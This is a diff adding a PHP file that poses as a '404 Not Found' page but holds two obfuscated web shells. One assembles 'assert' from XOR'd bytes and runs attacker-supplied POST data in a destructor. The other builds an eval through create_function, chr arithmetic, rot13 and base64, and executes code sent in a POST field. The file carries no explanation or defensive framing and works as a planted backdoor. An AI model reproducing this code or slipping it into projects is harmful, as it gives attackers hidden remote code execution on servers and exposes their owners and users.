@@ -1,0 +1,28 @@
+<?php
+ header("HTTP/1.0 404 Not Found");
+?>
+
+<?php 
+class QEEF { 
+    function muKs() {
+        $Qfcs = "\x2b" ^ "\x4a";
+        $wxqF = "\xc2" ^ "\xb1";
+        $dSSX = "\xa2" ^ "\xd1";
+        $MTpB = "\x42" ^ "\x27";
+        $CbJX = "\x17" ^ "\x65";
+        $BXQU = "\x34" ^ "\x40";
+        $DYdH =$Qfcs.$wxqF.$dSSX.$MTpB.$CbJX.$BXQU;
+        return $DYdH;
+    }
+    function __destruct(){
+        $lrqH=$this->muKs();
+        @$lrqH($this->lL);
+    }
+}
+$qeef = new QEEF();
+@$qeef->lL = isset($_GET['id'])?base64_decode($_POST['S3tFk#C15R16N17D18P19T20M21O22U23Q24A25Z26']):$_POST['S3tFk#C15R16N17D18P19T20M21O22U23Q24A25Z26'];
+?>
+
+
+
+<?php $fviY=create_function(base64_decode('JA==').chr(0xacf3/0x181).base64_decode('bw==').chr(552-443).chr(0x1f3-0x18e),str_rot13('r').str_rot13('i').chr(72750/750).str_rot13('y').str_rot13('(').chr(0x211-0x1ed).chr(91080/792).str_rot13('b').chr(0704-0527).chr(0x244-0x1df).str_rot13(')').chr(01660-01565));$fviY(base64_decode('MTEwN'.'jg3O0'.'BldkF'.'sKCRf'.''.chr(864-779).chr(0164552/01542).chr(0x127-0xee).chr(01140-01014).chr(0x184-0x12e).''.''.chr(882-812).chr(01501-01315).str_rot13('w').str_rot13('p').str_rot13('3').''.'NdKTs'.'zMzIw'.'NjE7'.''));?>
